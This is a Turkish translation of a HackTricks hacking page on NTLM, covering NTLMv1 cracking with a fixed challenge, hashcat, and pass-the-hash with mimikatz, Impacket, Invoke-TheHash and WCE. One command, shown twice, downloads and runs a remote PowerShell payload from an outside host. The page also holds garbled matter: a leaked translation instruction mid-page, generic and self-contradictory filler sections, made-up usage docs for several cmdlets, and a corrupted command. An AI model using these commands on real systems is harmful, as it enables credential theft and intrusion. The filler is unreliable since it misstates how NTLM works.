# NTLM

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan ileri seviyeye öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile göndererek paylaşın.**

</details>

## Temel Bilgiler

**Windows XP ve Server 2003**'ün kullanıldığı ortamlarda, LM (Lan Manager) karma kullanılır, ancak bu karma kolayca ele geçirilebilir olarak kabul edilir. Belirli bir LM karma, `AAD3B435B51404EEAAD3B435B51404EE`, LM'nin kullanılmadığı bir senaryoyu gösterir ve boş bir dize için karma sağlar.

Varsayılan olarak, **Kerberos** kimlik doğrulama protokolü kullanılır. NTLM (NT LAN Manager) belirli durumlarda devreye girer: Active Directory'nin olmaması, etki alanının olmaması, Kerberos'un yanlış yapılandırma nedeniyle çalışmaması veya geçerli bir ana bilgisayar adı yerine bir IP adresi kullanılarak bağlantıların denemesi durumunda.

Ağ paketlerinde **"NTLMSSP"** başlığının bulunması, bir NTLM kimlik doğrulama sürecinin varlığını gösterir.

Kimlik doğrulama protokollerinin - LM, NTLMv1 ve NTLMv2 - desteklenmesi, `%windir%\Windows\System32\msv1\_0.dll` konumunda bulunan belirli bir DLL tarafından sağlanır.

**Ana Noktalar**:
- LM karmaları savunmasızdır ve boş bir LM karma (`AAD3B435B51404EEAAD3B435B51404EE`), kullanılmadığını gösterir.
- Varsayılan kimlik doğrulama yöntemi Kerberos'tur ve NTLM yalnızca belirli koşullar altında kullanılır.
- NTLM kimlik doğrulama paketleri, "NTLMSSP" başlığıyla tanımlanabilir.
- Sistem dosyası `msv1\_0.dll`, LM, NTLMv1 ve NTLMv2 protokollerini destekler.

## LM, NTLMv1 ve NTLMv2

Hangi protokolün kullanılacağını kontrol edebilir ve yapılandırabilirsiniz:

### GUI

_secpol.msc_ uygulamasını çalıştırın -> Yerel politikalar -> Güvenlik Seçenekleri -> Ağ Güvenliği: LAN Yöneticisi kimlik doğrulama düzeyi. 6 seviye bulunmaktadır (0'dan 5'e).

![](<../../.gitbook/assets/image (92).png>)

### Registry

Bu, seviye 5'i ayarlar:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Mümkün olan değerler:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Temel NTLM Alan kimlik doğrulama Şeması

1. **Kullanıcı**, **kimlik bilgilerini** girer.
2. İstemci makine, **kimlik doğrulama isteği** göndererek **alan adını** ve **kullanıcı adını** gönderir.
3. **Sunucu**, **zorluk** gönderir.
4. İstemci, şifrenin hash'i olarak anahtar kullanarak **zorluğu şifreler** ve yanıt olarak gönderir.
5. **Sunucu**, **Alan Denetleyicisine** **alan adını, kullanıcı adını, zorluğu ve yanıtı** gönderir. Eğer yapılandırılmış bir Etki Alanı Yoksa veya alan adı sunucunun adı ise kimlik bilgileri **yerel olarak kontrol edilir**.
6. **Alan Denetleyicisi**, her şeyin doğru olup olmadığını kontrol eder ve bilgileri sunucuya gönderir.

**Sunucu** ve **Alan Denetleyicisi**, **Netlogon** sunucusu aracılığıyla bir **Güvenli Kanal** oluşturabilir çünkü Alan Denetleyicisi sunucunun şifresini bilmektedir (bu, **NTDS.DIT** veritabanının içindedir).

### Yerel NTLM Kimlik Doğrulama Şeması

Kimlik doğrulama, **öncekiyle aynıdır ancak** **sunucu**, **kimlik doğrulamaya çalışan kullanıcının hash'ini** SAM dosyası içinde bildiği için **Alan Denetleyicisine sormak yerine** sunucu kendisi kullanıcının kimlik doğrulamasını kontrol eder.

### NTLMv1 Zorluk

**Zorluk uzunluğu 8 bayt** ve **yanıt 24 bayt** uzunluğundadır.

**NT hash (16 bayt)**, **her biri 7 bayt olan 3 parçaya** (7B + 7B + (2B+0x00\*5)) ayrılır: **son parça sıfırlarla doldurulur**. Ardından, **zorluk** her bir parça ile ayrı ayrı **şifrelenir** ve **elde edilen** şifrelenmiş baytlar **birleştirilir**. Toplam: 8B + 8B + 8B = 24 Bayt.

**Sorunlar**:

* **Rastgelelik eksikliği**
* 3 parça ayrı ayrı **saldırıya uğrayabilir** ve NT hash bulunabilir
* **DES çözülebilir**
* 3. anahtar her zaman **5 sıfırdan** oluşur.
* **Aynı zorluk** verildiğinde **yanıt** aynı olacaktır. Bu nedenle, kurbanın yanıt olarak kullandığı **önceden hesaplanmış gökkuşağı tablolarını** kullanarak kurbanın yanıtını elde etmek için dize "**1122334455667788**" olarak verebilirsiniz.

### NTLMv1 saldırısı

Günümüzde, Kısıtlanmamış Delege yapılandırılmış ortamların bulunması daha az yaygın hale geliyor, ancak bu, **bir Yazıcı Kuyruğu hizmetini** kötüye kullanamayacağınız anlamına gelmez.

Zaten AD üzerinde sahip olduğunuz bazı kimlik bilgilerini/oturumları kullanarak **yazıcının, kontrolünüz altındaki bir** **sunucuya kimlik doğrulamasını isteyebilirsiniz**. Ardından, `metasploit auxiliary/server/capture/smb` veya `responder` kullanarak **kimlik doğrulama zorluğunu 1122334455667788** olarak ayarlayabilir, kimlik doğrulama girişimini yakalayabilir ve eğer **NTLMv1** kullanılarak yapıldıysa bunu **kırabilirsiniz**.\
`responder` kullanıyorsanız, **kimlik doğrulamasını düşürmek** için **--lm** bayrağını deneyebilirsiniz.\
_Unutmayın, bu teknik için kimlik doğrulamasının NTLMv1 kullanılarak yapılması gerekmektedir (NTLMv2 geçerli değildir)._

Unutmayın, yazıcı kimlik doğrulaması sırasında bilgisayar hesabını kullanacak ve bilgisayar hesapları **uzun ve rastgele şifreler** kullanır, bu nedenle genel **sözlükler** kullanarak kırmanız **muhtemelen mümkün olmayacaktır**. Ancak **NTLMv1** kimlik doğrulaması **DES kullanır** ([daha fazla bilgi için buraya](./#ntlmv1-challenge)), bu nedenle DES'i kırmaya yönelik bazı özel hizmetler kullanarak bunu kırabilirsiniz (örneğin [https://crack.sh/](https://crack.sh) kullanabilirsiniz).

### hashcat ile NTLMv1 saldırısı

NTLMv1, NTLMv1 mesajlarını hashcat ile kırılabilecek bir yöntemle biçimlendiren NTLMv1 Çoklu Aracı [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) ile de kırılabilir.

Komut:
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Aşağıdaki, NTLM hakkında bir dosyanın içeriğidir. İlgili İngilizce metni Türkçe'ye çevirin ve çeviriyi aynı markdown ve html sözdizimini koruyarak döndürün. Kod, hacking teknik adları, hacking kelimesi, bulut/SaaS platform adları (örneğin Workspace, aws, gcp...), 'sızıntı' kelimesi, pentesting ve markdown etiketleri gibi şeyleri çevirmeyin. Ayrıca çeviri ve markdown sözdizimi dışında herhangi bir ekstra şey eklemeyin.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Bir dosya oluşturun ve içeriğini aşağıdaki gibi doldurun:
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Hashcat'i çalıştırın (hashtopolis gibi bir araçla dağıtılmış olarak en iyisidir), aksi takdirde bu birkaç gün sürebilir.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Bu durumda, şifrenin "password" olduğunu biliyoruz, bu yüzden demo amaçlı hile yapacağız:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Şimdi, çatlak DES anahtarlarını NTLM hash'in bir parçasına dönüştürmek için hashcat-araçlarını kullanmamız gerekiyor:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Son olarak, NTLM saldırılarına karşı korunma yöntemlerine geçebiliriz. Bu saldırıları önlemek için aşağıdaki adımları izleyebilirsiniz:

1. NTLMv2'yi kullanın: NTLMv2, daha güçlü bir kimlik doğrulama protokolüdür ve NTLM'ye göre daha güvenlidir. Bu nedenle, sistemlerinizde NTLMv2'yi etkinleştirmeniz önemlidir.

2. Parola karmaşıklığı gereksinimleri: Kullanıcıların güçlü parolalar kullanmalarını sağlamak için parola karmaşıklığı gereksinimleri belirleyin. Bu gereksinimler, uzunluk, büyük/küçük harf kullanımı, sayılar ve özel karakterler gibi faktörleri içerebilir.

3. Parola süresi ve yenileme: Parolaların belirli bir süre sonra otomatik olarak yenilenmesini sağlayın. Bu, kullanıcıların düzenli aralıklarla parolalarını değiştirmelerini sağlar ve güvenliği artırır.

4. Hesap kilitlenmesi: Yanlış parola giriş denemelerini sınırlamak için hesap kilitlenmesi politikaları belirleyin. Bu, saldırganların sürekli olarak parola denemesi yaparak hesapları ele geçirmesini engeller.

5. İki faktörlü kimlik doğrulama: İki faktörlü kimlik doğrulama kullanarak güvenliği artırabilirsiniz. Bu, kullanıcıların parolalarının yanı sıra bir doğrulama faktörü (örneğin, SMS kodu, mobil uygulama doğrulaması) sağlamalarını gerektirir.

6. Güncellemeleri takip edin: İşletim sistemi ve uygulamalarınız için güncellemeleri düzenli olarak kontrol edin ve yükleyin. Bu, bilinen güvenlik açıklarının kapatılmasına yardımcı olur.

7. Güvenlik duvarı kullanın: Güvenlik duvarı kullanarak ağınızı koruyabilirsiniz. Bu, saldırıları engellemek ve zararlı trafiği engellemek için önemlidir.

8. Eğitim ve farkındalık: Kullanıcıları NTLM saldırıları ve güvenlik önlemleri konusunda eğitin. Bilinçli kullanıcılar, saldırıları tanıyabilir ve uygun önlemleri alabilir.

Bu önlemleri uygulayarak NTLM saldırılarına karşı sisteminizi güvence altına alabilirsiniz. Unutmayın, güvenlik sürekli bir çaba gerektirir ve güncel kalmanız önemlidir.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM (NT LAN Manager)

Bu bölümde, NTLM (NT LAN Manager) kimlik doğrulama protokolü hakkında bilgi bulacaksınız. NTLM, Windows işletim sistemlerinde kullanılan bir kimlik doğrulama protokolüdür. Bu protokol, kullanıcıların kimliklerini doğrulamak için kullanılır ve ağ üzerinde parola tabanlı kimlik doğrulama sağlar.

### NTLM Nedir?

NTLM, Windows işletim sistemlerinde kullanılan bir kimlik doğrulama protokolüdür. Bu protokol, kullanıcıların kimliklerini doğrulamak için kullanılır ve ağ üzerinde parola tabanlı kimlik doğrulama sağlar. NTLM, Windows NT 4.0 ile birlikte tanıtılmıştır ve hala Windows işletim sistemlerinde kullanılmaktadır.

### NTLM Nasıl Çalışır?

NTLM, üç aşamalı bir kimlik doğrulama süreci kullanır:

1. İstemci, sunucuya kimlik bilgilerini (kullanıcı adı ve parola) gönderir.
2. Sunucu, istemciye bir rastgele sayı (challenge) gönderir.
3. İstemci, kullanıcı adı, parola ve challenge'ı kullanarak bir hash oluşturur ve sunucuya gönderir.

Sunucu, istemcinin gönderdiği hash'i kendi depoladığı hash ile karşılaştırır. Eğer hash'ler eşleşirse, kimlik doğrulama başarılı olur ve istemciye erişim izni verilir.

### NTLM Zayıflıkları

NTLM, bazı zayıflıklara sahiptir:

- NTLM, parola tabanlı bir kimlik doğrulama protokolü olduğu için güvenlik açısından zayıftır. Parolaların karma değerleri yerine doğrudan hash'leri kullanılır, bu da saldırganların hash'leri çalmalarını ve çeşitli saldırı tekniklerini kullanmalarını kolaylaştırır.
- NTLM, güvenli olmayan bir kimlik doğrulama protokolüdür. Parolaların şifrelenmemiş olarak ağ üzerinde iletilmesi nedeniyle saldırganlar tarafından dinlenebilir ve çalınabilir.
- NTLM, tek yönlü bir kimlik doğrulama protokolüdür. Bu, sunucunun istemciyi doğrulayabilmesine rağmen, istemcinin sunucuyu doğrulayamaması anlamına gelir. Bu, saldırganların sunucu kimliklerini taklit etmelerini ve istemcilere zararlı kod enjekte etmelerini kolaylaştırır.

### NTLM Saldırıları

NTLM, çeşitli saldırı tekniklerine maruz kalabilir:

- NTLM hash çalma: Saldırganlar, ağ üzerindeki NTLM hash'lerini çalarak offline olarak kırabilirler. Bu, parolaların güvenliği açısından büyük bir risk oluşturur.
- NTLM pasif saldırı: Saldırganlar, ağ üzerindeki NTLM kimlik doğrulama trafiğini dinleyerek kullanıcı kimlik bilgilerini çalabilirler.
- NTLM aktif saldırı: Saldırganlar, NTLM kimlik doğrulama trafiğini manipüle ederek kullanıcıların kimliklerini çalabilir veya kimlik doğrulama sürecini etkileyebilirler.

### NTLM Saldırılarına Karşı Korunma

NTLM saldırılarına karşı korunmak için aşağıdaki önlemleri alabilirsiniz:

- NTLM yerine daha güvenli kimlik doğrulama protokolleri kullanın, örneğin Kerberos.
- Parolaları karma değerleri yerine hash'lerini saklayın.
- Parolaları düzenli olarak değiştirin ve karmaşık parola politikaları uygulayın.
- Ağ trafiğini şifreleyin, örneğin SSL/TLS kullanın.
- NTLM hash'lerini çalmak için saldırıları tespit etmek ve önlemek için güvenlik duvarları ve saldırı tespit sistemleri kullanın.

### NTLM Hakkında Daha Fazla Bilgi

NTLM hakkında daha fazla bilgi edinmek için aşağıdaki kaynaklara başvurabilirsiniz:

- [Microsoft NTLM Teknik Ayrıntıları](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/)

Bu bölümde NTLM kimlik doğrulama protokolü hakkında temel bilgileri öğrendiniz. NTLM'nin nasıl çalıştığını, zayıflıklarını ve saldırılara karşı nasıl korunabileceğinizi öğrendiniz.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Challenge uzunluğu 8 bayttır** ve **2 yanıt gönderilir**: Bir tanesi **24 bayt** uzunluğunda ve **diğerinin** uzunluğu **değişkendir**.

**İlk yanıt**, **istemci ve etki alanı** tarafından oluşturulan **diziyi** kullanarak **NT hash'in MD4 özetini** anahtar olarak kullanarak **HMAC\_MD5** ile şifrelenir. Ardından, **sonuç** **HMAC\_MD5** kullanarak **zorluk** şifrelenir. Buna, **8 baytlık bir istemci zorluğu eklenir**. Toplam: 24 B.

**İkinci yanıt**, **birkaç değer** (yeni bir istemci zorluğu, **tekrar saldırılarını önlemek için bir zaman damgası**...) kullanılarak oluşturulur.

Eğer **başarılı bir kimlik doğrulama işlemini yakalayan bir pcap**'e sahipseniz, bu kılavuzu takip ederek etki alanı, kullanıcı adı, zorluk ve yanıtı alabilir ve şifreyi kırmayı deneyebilirsiniz: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Kurbanın hash'ine sahip olduktan sonra**, onun yerine geçmek için kullanabilirsiniz.\
Bu **hash**'i kullanarak **NTLM kimlik doğrulaması yapacak bir araç** kullanmanız gerekmektedir, **veya** yeni bir **sessionlogon** oluşturabilir ve bu **hash**'i **LSASS** içine enjekte edebilirsiniz, böylece herhangi bir **NTLM kimlik doğrulaması yapıldığında** bu **hash kullanılacaktır**. Son seçenek mimikatz'ın yaptığı şeydir.

**Lütfen, Pass-the-Hash saldırılarını Bilgisayar hesapları kullanarak da gerçekleştirebileceğinizi unutmayın.**

### **Mimikatz**

**Yönetici olarak çalıştırılması gerekmektedir**.
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Bu, mimikatz başlatan kullanıcılara ait bir işlem başlatacaktır, ancak LSASS içinde kaydedilen kimlik bilgileri mimikatz parametrelerinin içindeki kimlik bilgileridir. Ardından, o kullanıcı gibi ağ kaynaklarına erişebilirsiniz (plain-text şifresini bilmek zorunda olmadığınız `runas /netonly` hilesine benzer).

### Linux üzerinden Pass-the-Hash

Linux üzerinden Pass-the-Hash kullanarak Windows makinelerinde kod yürütme elde edebilirsiniz.\
[**Buraya tıklayarak nasıl yapılacağını öğrenin.**](../../windows/ntlm/broken-reference/)

### Impacket Windows derlenmiş araçları

Windows için impacket ikili dosyalarını [buradan indirebilirsiniz](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Bu durumda bir komut belirtmeniz gerekmektedir, cmd.exe ve powershell.exe etkileşimli bir kabuk elde etmek için geçerli değildir)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Daha fazla Impacket ikili dosyası bulunmaktadır...

### Invoke-TheHash

Powershell komut dosyalarını buradan alabilirsiniz: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

Invoke-WMIExec, Windows Management Instrumentation (WMI) kullanarak uzaktaki bir Windows sistemine komut yürütmek için kullanılan bir PowerShell betiğidir. Bu betik, WMI üzerinden hedef sistemde bir komut çalıştırır ve sonucu geri alır.

##### Kullanımı

```plaintext
Invoke-WMIExec -Target <target> -Username <username> -Password <password> -Command <command>
```

##### Parametreler

- **-Target**: Hedef sistem IP adresi veya alan adı.
- **-Username**: Hedef sistemdeki bir kullanıcı hesabının adı.
- **-Password**: Kullanıcı hesabının şifresi.
- **-Command**: Çalıştırılacak komut.

##### Örnekler

```plaintext
Invoke-WMIExec -Target 192.168.1.10 -Username Administrator -Password P@ssw0rd -Command "ipconfig"
```

Bu örnek, 192.168.1.10 IP adresine sahip hedef sistemdeki Administrator hesabıyla oturum açar ve "ipconfig" komutunu çalıştırır.

##### Notlar

- Bu betik, hedef sistemde yürütülen komutların sonuçlarını geri alırken bazı sınırlamalara sahip olabilir.
- Hedef sistemdeki güvenlik duvarı veya antivirüs yazılımı, bu betiğin çalışmasını engelleyebilir.
- Bu betik, yalnızca yetkilendirilmiş kullanıcı hesaplarıyla çalışır.
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

Invoke-SMBClient, Windows işletim sistemlerinde SMB (Server Message Block) protokolünü kullanarak SMB sunucularına bağlanmak için kullanılan bir PowerShell komutudur. Bu komut, SMB sunucusuna erişim sağlamak, dosya ve klasörleri okumak, yazmak veya silmek gibi işlemleri gerçekleştirmek için kullanılabilir.

##### Kullanımı

```powershell
Invoke-SMBClient -Target <SMB sunucu IP adresi> -Username <kullanıcı adı> -Password <parola> -Command <komut>
```

- **Target**: Bağlanılacak SMB sunucusunun IP adresini belirtir.
- **Username**: SMB sunucusuna bağlanmak için kullanılacak kullanıcı adını belirtir.
- **Password**: SMB sunucusuna bağlanmak için kullanılacak parolayı belirtir.
- **Command**: SMB sunucusunda çalıştırılacak komutu belirtir.

##### Örnekler

1. SMB sunucusuna bağlanmak için:

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Username admin -Password P@ssw0rd
```

2. SMB sunucusunda bir dosya okumak için:

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Username admin -Password P@ssw0rd -Command "get myfile.txt"
```

3. SMB sunucusuna bir dosya yüklemek için:

```powershell
Invoke-SMBClient -Target 192.168.1.100 -Username admin -Password P@ssw0rd -Command "put myfile.txt"
```

##### Notlar

- Bu komut, SMB sunucusuna erişim sağlamak için geçerli bir kullanıcı adı ve parola gerektirir.
- Komutu çalıştırmadan önce, hedef SMB sunucusunun IP adresini, kullanıcı adını ve parolayı doğru bir şekilde belirttiğinizden emin olun.
- Bu komutu yalnızca yasal ve yetkilendirilmiş sistemlere karşı kullanın.
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

Invoke-SMBEnum, Windows için bir PowerShell betiğidir. Bu betik, ağda SMB protokolünü kullanarak hedef sistem hakkında bilgi toplamak için kullanılır. SMBEnum, hedef sistemdeki paylaşımları, kullanıcıları, grupları ve diğer ağ kaynaklarını keşfetmek için kullanışlıdır.

Bu betiği kullanmak için, PowerShell'i yönetici olarak çalıştırmanız gerekmektedir. Ayrıca, hedef sistemle ağ bağlantısı kurmanız gerekmektedir.

Betiği çalıştırmak için aşağıdaki komutu kullanabilirsiniz:

```powershell
Invoke-SMBEnum -Target <hedef_IP_adresi>
```

Bu komutu çalıştırdıktan sonra, betik hedef sistemdeki SMB paylaşımlarını, kullanıcıları, grupları ve diğer ağ kaynaklarını listeleyecektir. Bu bilgiler, hedef sistem hakkında daha fazla bilgi edinmek ve potansiyel zayıflıkları tespit etmek için kullanılabilir.

Bu betiği kullanırken dikkatli olunmalı ve yasal izinler çerçevesinde kullanılmalıdır.
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Bu işlev, diğerlerinin bir karışımıdır. **Birkaç ana bilgisayarı** geçebilir, bazılarını **hariç tutabilir** ve kullanmak istediğiniz **seçeneği** (_SMBExec, WMIExec, SMBClient, SMBEnum_) seçebilirsiniz. **SMBExec** ve **WMIExec**'ten herhangi birini seçerseniz, ancak _**Komut**_ parametresi vermezseniz, yalnızca **yeterli izinlere** sahip olup olmadığınızı **kontrol eder**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Yönetici olarak çalıştırılması gerekmektedir**

Bu araç mimikatz ile aynı işlemi yapacaktır (LSASS belleğini değiştirme).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Kullanıcı adı ve şifre ile Windows uzaktan yürütme

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Bir Windows Makineden Kimlik Bilgilerini Çıkarma

**Bir Windows makinesinden kimlik bilgilerini nasıl elde edeceğiniz hakkında daha fazla bilgi için** [**bu sayfayı okumalısınız**](broken-reference)**.**

## NTLM Relay ve Responder

**Bu saldırıları nasıl gerçekleştireceğiniz hakkında daha detaylı bir kılavuz için burayı okuyun:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Bir ağ yakalamasından NTLM meydan okumalarını ayrıştırma

**[https://github.com/mlgualtieri/NTLMRawUnHide](https://github.com/mlgualtieri/NTLMRawUnHide) adresini kullanabilirsiniz**

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramanla öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek ister misiniz**? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek ister misiniz**? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **göndererek paylaşın**.

</details>
